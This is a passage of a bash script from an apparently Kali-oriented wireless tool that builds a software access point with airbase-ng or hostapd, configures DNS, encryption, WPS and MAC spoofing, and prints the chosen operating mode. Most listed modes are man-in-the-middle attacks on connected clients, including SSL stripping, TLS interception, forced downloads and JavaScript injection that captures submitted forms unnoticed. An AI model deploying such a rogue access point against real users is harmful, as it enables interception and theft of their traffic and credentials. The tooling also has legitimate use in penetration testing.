if [ -n "$Alt_DNS2" ] && [ ! -n "`grep 'nameserver $Alt_DNS2' /etc/resolv.conf`" ];then
	sed '$ a\nameserver '$Alt_DNS2'' /etc/resolv.conf > /etc/resolv1.conf && mv /etc/resolv1.conf /etc/resolv.conf
fi 

#################################################################################################################
# 						DNS servers							#
# 		If we are using ppp0 or ppp1 then get DNS servers from /etc/resolv.conf 			#
# 		If we are using hostapd & madwifi-ng then we will use our alternative DNS servers		#
#		alt_DNS1 & alt_DNS2 (see in the beginning of the script section 'OS Detection'			#
# 		Otherwise the script CAN"T resolve hostnames (problem unsolved until now)			#
# For all the other cases (ethX or wlanX) our first nameserver in /etc/resolv.conf will be used as DNS server	#
# 		and if a second one founded (two is enough) then it will be our second DNS server.		#
#################################################################################################################
if [ "$IFACE" = "ppp0" ] || [ "$IFACE" = "ppp1" ];then
	DNS1="`grep -m1 'nameserver' /etc/resolv.conf | awk '{print $2}'`"
		if [ "`grep 'nameserver' /etc/resolv.conf | awk '{print $2}' | wc -l`" -ge "2" ]; then
			DNS2="`grep 'nameserver' /etc/resolv.conf | awk '{print $2}' | tail -1`"
		else
			DNS2=""
		fi
else
	DNS1="`grep -m1 'nameserver' /etc/resolv.conf | awk '{print $2}'`"
	DNS2="`grep 'nameserver' /etc/resolv.conf | sed -n '2p' | awk '{print $2}'`"
fi

if [ "$ATHDRV" = "hostapd_madwifi" ];then
	if [ -n "$Alt_DNS1" ] || [ -n "$Alt_DNS2" ];then
		DNS1="$Alt_DNS1"
		DNS2="$Alt_DNS2"
	else
		echo "Sorry. It looks like both alternative DNS servers are set to none"
		echo "To be able to run this mode you HAVE to set at least one alternative DNS server"
		echo "Exit..."
		exit 1
	fi
fi


#################################################################################################################
# 				Let's give some output to the user						#
#################################################################################################################
$cecho ""$BLUE"           Internet interface - Gateway - IP - DNS servers"$END""
# Internet interface.
if [ -n "$IFACE" ]; then
	$cecho "Internet Interface   : "$GREEN"$IFACE" - "`ls /sys/class/net/"$IFACE"/device/driver/module/drivers`"$END""
fi
# Print Internet gateway.
if [ -n "$INET_Gateway" ]; then
	$cecho "Internet Gateway     : "$GREEN"$INET_Gateway"$END""
fi
# Print Internet IP.
if [ -n "$INETIP" ]; then
	$cecho "Internet IP          : "$GREEN"$INETIP"$END""
fi
# If we our using TOR mode then we will use TOR's DNS server, else if found DNS 1 server then print it - else stop
if [ -n "$DNS1" ] && [ WLNMODE = "TOR_tunnel" ];then
	$cecho "Primary DNS server   : "$GREEN"TOR's DNS"$END""
elif [ -n "$DNS1" ];then
	$cecho "Primary DNS server   : "$GREEN"$DNS1"$END""
fi
# If found secondary DNS 2 server then print it.
if [ -n "$DNS2" ]; then
	$cecho "Secondary DNS server : "$GREEN"$DNS2"$END""
fi

echo
$cecho ""$BLUE"           Software Access Point options"$END""
# Print wireless interface for the creation of SoftAP.
if [ -n "$WIFACE_MON" ]; then
	$cecho "Wireless NIC         : "$GREEN"$WIFACE_MON - "`ls /sys/class/net/"$WIFACE"/device/driver/module/drivers`""$END""
fi
# Print SoftAP gateway.
if [ -n "$INET_Gateway" ]; then
	$cecho "Gateway              : "$GREEN"192.168.60.129"$END""
fi
# Print SoftAP gateway.
if [ -n "$INET_Gateway" ]; then
	$cecho "Clients IPs          : "$GREEN"192.168.60.130 - 192.168.60.150"$END""
fi
#ESSID for SoftAP - Print it
if [ -n "$ESSID" ]; then
	$cecho "ESSID                : "$GREEN"$ESSID"$END""
else
	export  ESSID="free"
	$cecho "ESSID                : "$GREEN"$ESSID"$END""
fi 
# If MAC was given - print it - else get it from ifconfig output [optional input].
if [ -n "$MAC" ];then
	$cecho "MAC address          : "$GREEN"$MAC"$END""
else
	$cecho "MAC address          : "$GREEN""`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`""$END""
fi
# If CRDA was given - print it - else get it from 'iw reg get' command [optional input].
if [ -n "$CRDA" ];then
	$cecho "CRDA country         : "$GREEN"$CRDA"$END""
else
	$cecho "CRDA country         : "$GREEN""`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`""$END""
fi
# If channel was given - print it - else get it from iwlist [optional input].
if [ -n "$CHAN" ]; then
	$cecho "Channel              : "$GREEN"$CHAN"$END""
else
	export CHAN="`/sbin/iwlist $WIFACE channel | grep 'Current Frequency' | awk '{print $5}' | tr -cd '[[:digit:]]'`"
	$cecho "Channel              : "$GREEN"$CHAN"$END""
fi

# Our SoftAP is based on: Airbase-ng or Hostapd or Master mode?
if [ "$ATHDRV" = "monitor" ] || [ "$ATHDRV" = "no" ];then
	$cecho "Based on             : "$GREEN"Airbase-ng"$END""
	if [ "$hostapd_mode" = "a" ];then
		$cecho "IEEE 802.11 standard : "$GREEN""$hostapd_mode" 5GHz"$END""
	elif [ "$hostapd_mode" = "g" ];then
		$cecho "IEEE 802.11 standard : "$GREEN""$hostapd_mode" 2.4GHz"$END""
	fi
elif [ "$ATHDRV" = "hostapd" ] || [ "$ATHDRV" = "hostapd_madwifi" ];then
	$cecho "Based on             : "$GREEN"Hostapd"$END""
	if [ "$ieee80211n" = "1" ];then
		if [ "$hostapd_mode" = "a" ];then
			export n_mode="a/n"
		elif [ "$hostapd_mode" = "g" ];then
			export n_mode="g/n"
		fi
		if [ "$n_mode" = "a/n" ];then
			$cecho "IEEE802.11n draft 2.0: "$GREEN""$n_mode" 5GHz"$END""
				if [ -n "`grep "HT40" $HOME_DIR/aerial.conf`" ];then
					$cecho "Channel width set    : "$GREEN"40Mhz"$END""
				elif [ -n "`grep "HT20" $HOME_DIR/aerial.conf | grep -v "HT40"`" ];then
					$cecho "Channel width set    : "$GREEN"20Mhz"$END""
				fi
		elif [ "$n_mode" = "g/n" ];then
			$cecho "IEEE802.11n draft 2.0: "$GREEN""$n_mode" 2.4GHz"$END""
				if [ -n "`grep "HT40" $HOME_DIR/aerial.conf`" ];then
					$cecho "Channel width set    : "$GREEN"40Mhz"$END""
				elif [ -n "`grep "HT20" $HOME_DIR/aerial.conf | grep -v "HT40"`" ];then
					$cecho "Channel width set    : "$GREEN"20Mhz"$END""
				fi
		fi
	elif [ "$ieee80211n" = "0" ];then
		if [ "$hostapd_mode" = "a" ];then
			$cecho "IEEE 802.11 standard : "$GREEN""$hostapd_mode" 5GHz"$END""
		elif [ "$hostapd_mode" = "g" ];then
			$cecho "IEEE 802.11 standard : "$GREEN""$hostapd_mode" 2.4GHz"$END""
		fi
	fi
elif [ "$ATHDRV" = "master" ];then
	$cecho "Based on             : "$GREEN"Master mode"$END""
fi

# Print the type of encryption (open, wep 40bits, wep 104bits) we use and the key (if given).
if [ "$ENCR_TYPE" = "OPEN" ];then
	$cecho "Encryption           : "$GREEN"OPEN"$END""
elif [ "$ENCR_TYPE" = "ASCII_40" ];then
	$cecho "Encryption           : "$GREEN"WEP 40bits"$END""
	$cecho "ASCII password       : "$GREEN"$AP_KEY"$END""
elif [ "$ENCR_TYPE" = "HEX_40" ];then
	$cecho "Encryption           : "$GREEN"WEP 40bits"$END""
	$cecho "HEX password         : "$GREEN"$AP_KEY"$END""
elif [ "$ENCR_TYPE" = "ASCII_104" ];then
	$cecho "Encryption           : "$GREEN"WEP 104bits"$END""
	$cecho "ASCII password       : "$GREEN"$AP_KEY"$END""
elif [ "$ENCR_TYPE" = "HEX_104" ];then
	$cecho "Encryption           : "$GREEN"WEP 104bits"$END""
	$cecho "HEX password         : "$GREEN"$AP_KEY"$END""
elif [ "$ENCR_TYPE" = "WPA2" ];then
	$cecho "Encryption           : "$GREEN"WPA2-PSK (Pre-shared key)"$END""
	$cecho "Password             : "$GREEN"$AP_KEY"$END""
else
	export export ENCR_TYPE="OPEN"
	$cecho "Encryption           : "$GREEN"OPEN"$END""
fi

if [ "$WPS_PIN" != "NONE" ] && [ -n "$WPS_PIN" ] && [ "$ENCR_TYPE" = "WPA2" ];then
	$cecho "WPS pin              : "$GREEN"$WPS_PIN"$END""
elif [ "$WPS_PIN" = "NONE" ] && [ -n "$WPS_PIN" ] && [ "$ENCR_TYPE" = "WPA2" ];then
	$cecho "Wi-Fi protected setup: "$RED"Disabled"$END""
fi
WPS_PIN_COMMAND(){
	if [ "$WPS_PIN" != "NONE" ] && [ -n "$WPS_PIN" ] && [ "$ENCR_TYPE" = "WPA2" ];then
		echo
		$cecho "To connect a client using WPS virtual push button type in a console: "$RED"hostapd_cli wps_pbc"$END""
	fi
}
# Print what WLAN mode we will use
if [ "$WLNMODE" = "Simple" ];then
	$cecho "Mode                 : "$GREEN"Simple - Clients can access directly the Internet."$END""
elif [ "$WLNMODE" = "Proxied" ];then
	$cecho "Mode                 : "$GREEN"Transparent HTTP Proxied WLAN Optimized for Low Internet Speeds."$END""
elif [ "$WLNMODE" = "SSLstriped" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Transparent SSLstriped WLAN - SSL/TLS attack."$END""
elif [ "$WLNMODE" = "Proxied-SSLstriped" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Transparent Proxied and SSLstriped WLAN."$END""
elif [ "$WLNMODE" = "Fliped_Blured_Swirled" ] && [ "$F_B_S_command" = "flip" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Client's browser images will be Upside Down."$END""
elif [ "$WLNMODE" = "Fliped_Blured_Swirled" ] && [ "$F_B_S_command" = "blured" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Client's browser images will be Blurred."$END""
elif [ "$WLNMODE" = "Fliped_Blured_Swirled" ] && [ "$F_B_S_command" = "swirl" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Client's browser images will be Swirled."$END""
elif [ "$WLNMODE" = "ASCII" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Client's browser images will be converted into ASCII art."$END""
elif [ "$WLNMODE" = "Tourtt_Imgs" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Client's browser images will be added by words."$END""
elif [ "$WLNMODE" = "Forced_download" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Client's will be forced to download our files."$END""
elif [ "$WLNMODE" = "Air_chat" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Client's of WLAN will chat with our SoftAP and each other."$END""
elif [ "$WLNMODE" = "TOR_tunnel" ];then
	$cecho "Mode                 : "$GREEN"Clients will Transparently, Anonymous surfing the web and access .onion sites through TOR."$END""
elif [ "$WLNMODE" = "I2P" ];then
	$cecho "Mode                 : "$GREEN"Clients will Manual, Anonymously* surfing the web and access .i2p sites through i2p network."$END""
	$cecho ""$RED"                      * DNS requests will pass through our Linux box. (DNS leaks)."$END""
elif [ "$WLNMODE" = "SSLsplit" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Transparent and scalable SSL/TLS intercepted WLAN."$END""
elif [ "$WLNMODE" = "MiTMproxy" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Transparent HTTP(S) intercepted WLAN."$END""
elif [ "$WLNMODE" = "HoneyProxy" ];then
	$cecho "Mode                 : "$GREEN"MiTM - Honeyproxy - Transparent HTTP(S) WLAN traffic investigating and analysis."$END""
elif [ "$WLNMODE" = "Squid_iTM" ];then
	$cecho "Mode                 : "$GREEN"Squid in The Middle - Transparent HTTP(S) proxied WLAN."$END""
elif [ "$WLNMODE" = "Java_Inject" ];then
	$cecho "Mode                 : "$GREEN"JavaScript in The Middle - Squid will inject each javascript file passing through the proxy."$END""
	if [ $Java_script = "1" ];then
		$cecho "Injected script      : "$GREEN"Will display an annoying alert with a message."$END""
	elif [ $Java_script = "2" ];then
		$cecho "Injected script      : "$GREEN"Captures the submitted form content without being noticed by the user."$END""
	elif [ $Java_script = "3" ];then
		$cecho "Injected script      : Custom script: "$GREEN""$custom_Java_script""$END""
	fi
fi

#################################################################################################################
# 					Kernel's Entropy Pool Calculation					#
#														#
# Measure (and enable <=1536 bytes if needed) entropy if we use encryption (WEP or WPA) and/or we use hostapd.	#														#
# The entropy pool size in Linux is viewable through the file and should generally be at least 			#
# 2000 bytes (out of a maximum of 4096).									#
# Check your entropy pool by running: cat /proc/sys/kernel/random/entropy_avail					#
# This command shows you how much entropy your server has collected. If it is rather low (<1500), we should 	#
# probably start haveged. Otherwise cryptographic applications will block until there is enough entropy 	#
# available, which e.g. could result in slow wlan speed, if your server is a Software access point.		#
# https://wiki.archlinux.org/index.php/Haveged									#
# http://en.wikipedia.org/wiki/Entropy_%28computing%29#Practical_implications					#
#################################################################################################################
if [ "$ENCR_TYPE" != "OPEN" ] || [ "$ATHDRV" = "hostapd" ] || [ "$ATHDRV" = "hostapd_madwifi" ];then
	$necho "[....] Measuring kernel's entropy pool size."
		for i in $(seq 1 16)
			do
				export a="`cat /proc/sys/kernel/random/entropy_avail`"
				sleep 0.25
				export entropy="`expr $entropy + $a`"
			done
	$cecho "\r[ "$GREEN"ok"$END" ] Measuring kernel's entropy pool size."
	export entropy="`expr $entropy / 16`"
	if [ $entropy -lt 1536 ];then
		$cecho "\r[ "$RED"info"$END" ] Low Entropy Pool Size: "$RED""$entropy""$END" bytes."
		$necho "[....] Starting Haveged: Linux entropy source using the HAVEGE algorithm."
		haveged -w 2048
		$cecho "\r[ "$GREEN"ok"$END" ] Starting Haveged: Linux entropy source using the HAVEGE algorithm."
	else
		$cecho "\r[ "$RED"info"$END" ] Entropy Pool size looks OK: "$GREEN""$entropy""$END" bytes."
	fi
fi

#################################################################################################################
#				Airbase-ng NBPPS (Number of packets per second)					#
# 			If we using it then print the value else print the default value			#
#################################################################################################################
if [ "$Nbpps_USE" = "yes" ] && [ $Nbpps_VALUE -le 1000 ] && [ $Nbpps_VALUE -ge 1 ] && [ "$ATHDRV" = "monitor" -o "$ATHDRV" = "no" ];then
	$cecho "[ "$RED"info"$END" ] Airbase-ng NBPPS (Number of packets per second): "$GREEN""$Nbpps_VALUE""$END" pps."
elif [ "$ATHDRV" = "monitor" ] || [ "$ATHDRV" = "no" ];then
	$cecho "[ "$RED"info"$END" ] Airbase-ng NBPPS (Number of packets per second): "$GREEN"100"$END" pps."
fi

#################################################################################################################
# 					Let's create a master mode interface.					#
# 				Create SoftAP for master mode (madwifi-ng drivers)				#
# 					! ! !DO NOT TRY IT IN KALI ! ! !					#
#################################################################################################################
if [ "$ATHDRV" = "master" ];then
	if [ "`/sbin/ifconfig | grep "$WIFACE_MON" | awk '{print $1}'`" = "$WIFACE_MON" ];then
		wlanconfig "$WIFACE_MON" destroy
	fi
	if [ -n "$MAC" ];then
		export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`"
		$necho "[....] MAC change [Current MAC:"$Cur_MAC" New MAC:"$MAC"]"
		ip link set dev "$WIFACE" down > /dev/null &
		macchanger --mac="$MAC" "$WIFACE" > /dev/null &
		ip link set dev "$WIFACE" up > /dev/null &
		$cecho "\r[ "$GREEN"ok"$END" ] MAC change [Current MAC:"$Cur_MAC" New MAC:"$MAC"]"
	fi
	wlanconfig "$WIFACE_MON" create wlandev "$WIFACE" wlanmode ap
	iwconfig "$WIFACE_MON" essid "$ESSID"
	if [ -n "$CHAN" ];then
		iwconfig "$WIFACE_MON" channel "$CHAN"
	fi
	if [ "$ENCR_TYPE" != "OPEN" ];then
		if [ "$ENCR_TYPE" = "ASCII_40" ] || [ "$ENCR_TYPE" = "ASCII_104" ];then
			AP_KEY="`echo -n "$AP_KEY" | xxd -p`"
			iwconfig $WIFACE_MON key $AP_KEY
		elif [ "$ENCR_TYPE" = "HEX_40" ] || [ "$ENCR_TYPE" = "HEX_104" ];then
			iwconfig $WIFACE_MON key $AP_KEY
		fi
	else
		iwconfig $WIFACE_MON key off
	fi
	iwconfig "$WIFACE_MON" rate auto
	ifconfig "$WIFACE_MON" up
fi

#################################################################################################################
# 				Well..... no master mode? We want airbase?					#
# 	Create SoftAP with airbase-ng (Any card that can inject or madwifi-ng drivers in monitor mode)		#
#################################################################################################################
if [ "$ATHDRV" = "monitor" ] || [ "$ATHDRV" = "no" ];then
	modprobe tun &
	cmd="xterm -geometry -0-0 -e airbase-ng -e "$ESSID" "
		if [ -n "$CHAN" ]; then
			cmd=$cmd"-c "$CHAN" "
		fi
		if [ -n "$MAC" ]; then
			cmd=$cmd"-a "$MAC" "
		fi
		if [ "$ENCR_TYPE" != "OPEN" ];then
			if [ "$ENCR_TYPE" = "ASCII_40" ] || [ "$ENCR_TYPE" = "ASCII_104" ];then
				AP_KEY="`echo -n "$AP_KEY" | xxd -p`"
				cmd=$cmd"-w "$AP_KEY" "
			elif [ "$ENCR_TYPE" = "HEX_40" ] || [ "$ENCR_TYPE" = "HEX_104" ];then
				cmd=$cmd"-w "$AP_KEY" "
			fi
		fi
	if [ "$Nbpps_USE" = "yes" ] && [ $Nbpps_VALUE -le 1000 ] && [ $Nbpps_VALUE -ge 100 ];then
	cmd=$cmd"-x $Nbpps_VALUE "
	fi
	cmd=$cmd"$WIFACE_MON"

	# Well, let's start airbase-ng but first let's release our wireless interface from Network manager.
	# Otherwise we CAN'T start airbase-ng 
	if [ -n "`pidof NetworkManager`" ] && [ ! -n "`grep "iface $WIFACE inet manual" /etc/network/interfaces`" ];then
		echo "iface $WIFACE inet manual" >> /etc/network/interfaces
		service network-manager stop
		service networking stop
		service networking start
		service network-manager start
		sleep 1
		$necho "[....] Waiting to connect again to the Internet."
			until [ "`/sbin/route -n | awk '($1 == "0.0.0.0") { print $NF ; exit }'`" != "" ];do
				for i in \| / - \\; do
					printf ' [%c]\b\b\b\b' $i 
					sleep .1 
				done 
			done
		$cecho "\r[ "$GREEN"ok"$END" ] Waiting to connect again to the Internet.     "
	else
		service network-manager stop
		service networking stop
		service networking start
		service network-manager start
		sleep 1
		$necho "[....] Waiting to connect again to the Internet."
			until [ "`/sbin/route -n | awk '($1 == "0.0.0.0") { print $NF ; exit }'`" != "" ];do
				for i in \| / - \\; do
					printf ' [%c]\b\b\b\b' $i 
					sleep .1 
				done 
			done
		$cecho "\r[ "$GREEN"ok"$END" ] Waiting to connect again to the Internet.     "

	fi
	# Re-enable OPEN DNS servers. They will be reseted by Network Manager
	if [ ! -n "`grep 'nameserver $Alt_DNS1' /etc/resolv.conf`" ];then
		sed '$ a\nameserver '$Alt_DNS1'' /etc/resolv.conf > /etc/resolv1.conf && mv /etc/resolv1.conf /etc/resolv.conf
	fi
	if [ ! -n "`grep 'nameserver $Alt_DNS2' /etc/resolv.conf`" ];then
		sed '$ a\nameserver '$Alt_DNS2'' /etc/resolv.conf > /etc/resolv1.conf && mv /etc/resolv1.conf /etc/resolv.conf
	fi 
	# Fire up airbase-ng but hey! Let's wait a little bit (3 sec)
	# Forgot that. Thanks to dataghost
	ifconfig $WIFACE down
	$cmd &
	sleep 4
fi

#################################################################################################################
# 			That's what I was talking about. Much better now. Hostapd!				#
#################################################################################################################
if [ "$ATHDRV" = "hostapd" ] || [ "$ATHDRV" = "hostapd_madwifi" ];then
	if [ "$ATHDRV" = "hostapd" ];then
		#$cecho ""$RED"Creating custom hostapd.conf (nl80211 driver)"$END""
		#$cecho ""$GREEN"Done..."$END""
		# Create custom hostapd.conf with nl80211 driver
cat > $HOME_DIR/hostapd.conf <<EOF
# Interface, driver,essid,IEEE 802.11 mode,channel.
interface=$WIFACE
driver=nl80211
ssid=$ESSID
hw_mode=$hostapd_mode
channel=$CHAN

#IEEE 802.11 related configuration
macaddr_acl=0
beacon_int=100
dtim_period=2
max_num_sta=20
rts_threshold=2347
fragm_threshold=2346
ignore_broadcast_ssid=0
macaddr_acl=0

# Enable IEEE 802.11d. This advertises the country_code and the set of allowed
# channels and transmit power levels based on the regulatory limits.
country_code=$CRDA
ieee80211d=1
#ieee80211h=1

# IEEE 802.11n related configuration
ieee80211n=0

# The following will be replaced by the script with the corresponding 
# values depending on your wireless NIC
#ht_capab=

# Event logger configuration
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

ctrl_interface_group=0
ctrl_interface=/var/run/hostapd

# TX queue parameters (EDCF / bursting)

# Low priority / AC_BK = background
tx_queue_data3_aifs=7
tx_queue_data3_cwmin=15
tx_queue_data3_cwmax=1023
tx_queue_data3_burst=0

# Normal priority / AC_BE = best effort
tx_queue_data2_aifs=3
tx_queue_data2_cwmin=15
tx_queue_data2_cwmax=63
tx_queue_data2_burst=0

# High priority / AC_VI = video
tx_queue_data1_aifs=1
tx_queue_data1_cwmin=7
tx_queue_data1_cwmax=15
tx_queue_data1_burst=3.0

# Highest priority / AC_VO = voice
tx_queue_data0_aifs=1
tx_queue_data0_cwmin=3
tx_queue_data0_cwmax=7
tx_queue_data0_burst=1.5

# Default WMM parameters (IEEE 802.11 draft; 11-03-0504-03-000e):
wmm_enabled=1
# Low priority / AC_BK = background
wmm_ac_bk_cwmin=4
wmm_ac_bk_cwmax=10
wmm_ac_bk_aifs=7
wmm_ac_bk_txop_limit=0
wmm_ac_bk_acm=0
# Normal priority / AC_BE = best effort
wmm_ac_be_aifs=3
wmm_ac_be_cwmin=4
wmm_ac_be_cwmax=10
wmm_ac_be_txop_limit=0
wmm_ac_be_acm=0
# High priority / AC_VI = video
wmm_ac_vi_aifs=2
wmm_ac_vi_cwmin=3
wmm_ac_vi_cwmax=4
wmm_ac_vi_txop_limit=94
wmm_ac_vi_acm=0
# Highest priority / AC_VO = voice
wmm_ac_vo_aifs=2
wmm_ac_vo_cwmin=2
wmm_ac_vo_cwmax=3
wmm_ac_vo_txop_limit=47
wmm_ac_vo_acm=0
EOF
	fi
	# Hostapd & madwifi driver
	if [ "$ATHDRV" = "hostapd_madwifi" ];then
		sed 's%driver=nl80211%driver=madwifi%g' $HOME_DIR/hostapd.conf > $HOME_DIR/hostapd.conf1 && mv $HOME_DIR/hostapd.conf1 $HOME_DIR/hostapd.conf
	fi
	# 5 GHz DFS
	if [ "$hostapd_mode" = "a" ];then
		sed 's%#ieee80211h=1%ieee80211h=1%g' $HOME_DIR/hostapd.conf > $HOME_DIR/hostapd.conf1 && mv $HOME_DIR/hostapd.conf1 $HOME_DIR/hostapd.conf
	fi
	# Should we change MAC address when madwifi driver is used?
	if [ -n "$MAC" ] && [ "$ATHDRV" = "hostapd_madwifi" ];then
		export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`"
		$necho "[....] MAC change [Current MAC:"$Cur_MAC" New MAC:"$MAC"]"
		wlanconfig "$WIFACE_MON" destroy > /dev/null &
		ip link set dev "$WIFACE" down > /dev/null &
		macchanger --mac="$MAC" "$WIFACE" > /dev/null &
		ip link set dev "$WIFACE" up > /dev/null &
		wlanconfig "$WIFACE_MON" create wlandev "$WIFACE" wlanmode ap > /dev/null &
		$cecho "\r[ "$GREEN"ok"$END" ] MAC change [Current MAC:"$Cur_MAC" New MAC:"$MAC"]"
	fi
	# Should we change MAC address when nl80211driver is used?
	if [ -n "$MAC" ] && [ "$ATHDRV" = "hostapd" ];then
		export Cur_MAC="`/sbin/ifconfig "$WIFACE_MON" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z | sed 's%-%:%g'`"
		$necho "[....] MAC change [Current MAC:"$Cur_MAC" New MAC:"$MAC"]"
		ip link set dev "$WIFACE" down > /dev/null &
		macchanger --mac="$MAC" "$WIFACE" > /dev/null &
		ip link set dev "$WIFACE" up > /dev/null &
		$cecho "\r[ "$GREEN"ok"$END" ] MAC change [Current MAC:"$Cur_MAC" New MAC:"$MAC"]"
	fi

	# Should we enable IEEE80211n mode?
	if [ "$ieee80211n" = "1" ] && [ "$ht_capab" != "NONE" ] && [ "$hostapd_mode" = "a" -o "$hostapd_mode" = "g" ];then
		sed 's%ieee80211n=0%ieee80211n=1%g' $HOME_DIR/hostapd.conf > $HOME_DIR/hostapd.conf1 && mv $HOME_DIR/hostapd.conf1 $HOME_DIR/hostapd.conf
		sed 's%#ht_capab=.*%ht_capab='$ht_capab'%g' $HOME_DIR/hostapd.conf > $HOME_DIR/hostapd.conf1 && mv $HOME_DIR/hostapd.conf1 $HOME_DIR/hostapd.conf
	fi

	# A WEP key was given? (Any type)
	if [ "$ENCR_TYPE" = "ASCII_40" ] || [ "$ENCR_TYPE" = "ASCII_104" ] || [ "$ENCR_TYPE" = "HEX_40" ] || [ "$ENCR_TYPE" = "HEX_104" ];then
		sed -i '$a auth_algs=1' $HOME_DIR/hostapd.conf
		sed -i '$a eapol_key_index_workaround=0' $HOME_DIR/hostapd.conf
		sed -i '$a wep_default_key=0' $HOME_DIR/hostapd.conf
		sed -i '$a wpa=0' $HOME_DIR/hostapd.conf
		if [ "$ENCR_TYPE" = "ASCII_40" ] || [ "$ENCR_TYPE" = "ASCII_104" ];then
			sed -i '$a wep_key0="'$AP_KEY'"' $HOME_DIR/hostapd.conf
		elif [ "$ENCR_TYPE" = "HEX_40" ] || [ "$ENCR_TYPE" = "HEX_104" ];then
			export AP_KEY="`echo "$AP_KEY" | sed 's/[\:]//g'`"
			sed -i '$a wep_key0='$AP_KEY'' $HOME_DIR/hostapd.conf
		fi
		#sed -i '$a ieee8021x=1' $HOME_DIR/hostapd.conf
		#sed -i '$a wep_key_len_broadcast=5' $HOME_DIR/hostapd.conf
		#sed -i '$a wep_key_len_unicast=5' $HOME_DIR/hostapd.conf
	fi

	# Or a wpa passphrase?
	if [ "$ENCR_TYPE" = "WPA2" ];then
		touch /etc/hostapd.psk
		echo "" >> $HOME_DIR/hostapd.conf
		echo "# WPA/IEEE 802.11i configuration" >> $HOME_DIR/hostapd.conf
		echo "auth_algs=1" >> $HOME_DIR/hostapd.conf
		echo "wpa_psk_file=/etc/hostapd.psk" >> $HOME_DIR/hostapd.conf
		echo "wpa=2" >> $HOME_DIR/hostapd.conf
		echo "wpa_passphrase="$AP_KEY"" >> $HOME_DIR/hostapd.conf
		echo "wpa_key_mgmt=WPA-PSK" >> $HOME_DIR/hostapd.conf
		echo "wpa_pairwise=CCMP" >> $HOME_DIR/hostapd.conf
		echo "rsn_pairwise=CCMP" >> $HOME_DIR/hostapd.conf
		echo "wpa_ptk_rekey=3600" >> $HOME_DIR/hostapd.conf
		echo "eap_server=1" >> $HOME_DIR/hostapd.conf
			if [ "$WPS_PIN" != "NONE" ] && [ -n "$WPS_PIN" ];then
				touch /var/run/hostapd_wps_pin_requests
				echo "" >> $HOME_DIR/hostapd.conf
				echo "# WPA/IEEE 802.11i configuration" >> $HOME_DIR/hostapd.conf
				echo "wps_state=2" >> $HOME_DIR/hostapd.conf
				echo "wps_independent=0" >> $HOME_DIR/hostapd.conf
				echo "ap_setup_locked=0" >> $HOME_DIR/hostapd.conf
				echo "wps_pin_requests=/var/run/hostapd_wps_pin_requests" >> $HOME_DIR/hostapd.conf
				echo "device_name="$friendly_name" Access Point" >> $HOME_DIR/hostapd.conf
				echo "manufacturer=Nick_the_Greek" >> $HOME_DIR/hostapd.conf
				echo "model_name=Kali" >> $HOME_DIR/hostapd.conf
				echo "model_number=130807" >> $HOME_DIR/hostapd.conf
				echo "serial_number=314159265359" >> $HOME_DIR/hostapd.conf
				echo "device_type=6-0050F204-1" >> $HOME_DIR/hostapd.conf
				echo "os_version=13000806" >> $HOME_DIR/hostapd.conf
				echo "config_methods=label display ext_nfc_token int_nfc_token nfc_interface push_button keypad virtual_display physical_display virtual_push_button physical_push_button" >> $HOME_DIR/hostapd.conf
				echo "pbc_in_m1=1" >> $HOME_DIR/hostapd.conf
				echo "ap_pin="$WPS_PIN"" >> $HOME_DIR/hostapd.conf
				echo "wps_cred_processing=0" >> $HOME_DIR/hostapd.conf
				echo "upnp_iface="$WIFACE"" >> $HOME_DIR/hostapd.conf
				echo "friendly_name="$friendly_name" WPS Access Point" >> $HOME_DIR/hostapd.conf
				echo "manufacturer_url=https://forums.kali.org/member.php?24689-Nick_the_Greek" >> $HOME_DIR/hostapd.conf
				echo "model_description="$friendly_name" Wireless Access Point" >> $HOME_DIR/hostapd.conf
				echo "model_url=https://forums.kali.org/" >> $HOME_DIR/hostapd.conf
				echo "upc=123456789012" >> $HOME_DIR/hostapd.conf
				echo "wps_rf_bands="$hostapd_mode"" >> $HOME_DIR/hostapd.conf
			fi
	fi

	# Well, let's start hostapd but first let's release our wireless interface from Network manager.
	# Otherwise we CAN'T start hostapd 
	if [ -n "`pidof NetworkManager`" ] && [ ! -n "`grep "iface $WIFACE inet manual" /etc/network/interfaces`" ];then
		echo "iface $WIFACE inet manual" >> /etc/network/interfaces
		service network-manager stop
		service networking stop
		service networking start
		service network-manager start
		sleep 1
		$necho "[....] Waiting to connect again to the Internet."
			until [ "`/sbin/route -n | awk '($1 == "0.0.0.0") { print $NF ; exit }'`" != "" ];do
				for i in \| / - \\; do
					printf ' [%c]\b\b\b\b' $i 
					sleep .1 
				done 
			done
		$cecho "\r[ "$GREEN"ok"$END" ] Waiting to connect again to the Internet.     "

	fi
	# Re-enable OPEN DNS servers. They will be reseted by Network Manager
	if [ ! -n "`grep 'nameserver $Alt_DNS1' /etc/resolv.conf`" ];then
		sed '$ a\nameserver '$Alt_DNS1'' /etc/resolv.conf > /etc/resolv1.conf && mv /etc/resolv1.conf /etc/resolv.conf
	fi
	if [ ! -n "`grep 'nameserver $Alt_DNS2' /etc/resolv.conf`" ];then
		sed '$ a\nameserver '$Alt_DNS2'' /etc/resolv.conf > /etc/resolv1.conf && mv /etc/resolv1.conf /etc/resolv.conf
	fi 
	# Fire up Hostapd but hey! Let's wait a little bit (3 sec)
	sleep 3
	ifconfig $WIFACE up
	$necho "[....] Starting Hostapd. (conf file:$HOME_DIR/hostapd.conf)"
